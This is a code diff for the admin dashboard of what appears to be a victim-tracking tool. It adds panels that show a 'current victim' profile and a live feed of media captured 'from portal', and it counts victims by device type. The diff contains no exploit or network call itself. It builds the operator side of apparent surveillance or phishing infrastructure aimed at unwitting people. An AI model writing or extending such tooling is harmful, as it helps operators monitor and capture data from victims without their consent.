@@ -10,8 +10,10 @@ import {
     TrafficLog,
     DeviceChart,
     AdminLogin,
+    CurrentVictimPanel,
+    LiveFeedPanel,
 } from "@/components/admin";
-import { Victim } from "@/lib/sessions";
+import { Victim, VictimProfile, MediaCapture } from "@/lib/sessions";
 import styles from "./page.module.css";
 
 /**
@@ -53,6 +55,8 @@ export default function AdminDashboard() {
     const [particles, setParticles] = useState<ParticleData[]>([]);
     const [isClient, setIsClient] = useState(false);
     const [isAuthenticated, setIsAuthenticated] = useState(false);
+    const [currentVictim, setCurrentVictim] = useState<VictimProfile | undefined>(undefined);
+    const [mediaData, setMediaData] = useState<MediaCapture | undefined>(undefined);
     const router = useRouter();
 
     // Session key for authentication - changes on each app load
@@ -157,12 +161,30 @@ export default function AdminDashboard() {
                     return;
                 }
 
-                // New victim - update stats
+                // Current victim profile update
+                if (data.type === "current_victim" && data.profile) {
+                    setCurrentVictim(data.profile);
+                    return;
+                }
+
+                // Media update from portal
+                if (data.type === "media_update" && data.media) {
+                    setMediaData(data.media);
+                    return;
+                }
+
+                // Check if this is a VictimProfile (has sessionId)
+                if (data.sessionId) {
+                    setCurrentVictim(data);
+                }
+
+                // New victim - update stats (handle both legacy Victim and VictimProfile)
+                const deviceType = data.device?.type || data.device;
                 setStats((prev) => ({
                     count: prev.count + 1,
                     deviceBreakdown: {
                         ...prev.deviceBreakdown,
-                        [data.device]: (prev.deviceBreakdown[data.device as keyof typeof prev.deviceBreakdown] || 0) + 1,
+                        [deviceType]: (prev.deviceBreakdown[deviceType as keyof typeof prev.deviceBreakdown] || 0) + 1,
                     },
                     recentVictims: [...prev.recentVictims, data].slice(-20),
                 }));
@@ -324,7 +346,7 @@ export default function AdminDashboard() {
                         </HoloPanel>
                     </motion.div>
 
-                    {/* Device breakdown - right */}
+                    {/* Device breakdown */}
                     <motion.div
                         className={styles.chartPanel}
                         initial={{ x: 50, opacity: 0 }}
@@ -334,6 +356,26 @@ export default function AdminDashboard() {
                         <HoloPanel title="Device Analytics" icon="📊" size="full" animate={false}>
                             <DeviceChart data={stats.deviceBreakdown} />
                         </HoloPanel>
+                    </motion.div>
+
+                    {/* Current Victim Panel - right side */}
+                    <motion.div
+                        className={styles.victimPanel}
+                        initial={{ x: 50, opacity: 0 }}
+                        animate={{ x: 0, opacity: 1 }}
+                        transition={{ delay: 0.35 }}
+                    >
+                        <CurrentVictimPanel victim={currentVictim} />
+                    </motion.div>
+
+                    {/* Live Feed Panel - below victim panel */}
+                    <motion.div
+                        className={styles.livePanel}
+                        initial={{ x: 50, opacity: 0 }}
+                        animate={{ x: 0, opacity: 1 }}
+                        transition={{ delay: 0.4 }}
+                    >
+                        <LiveFeedPanel media={mediaData} />
                     </motion.div>
 
                     {/* Traffic log - bottom */}
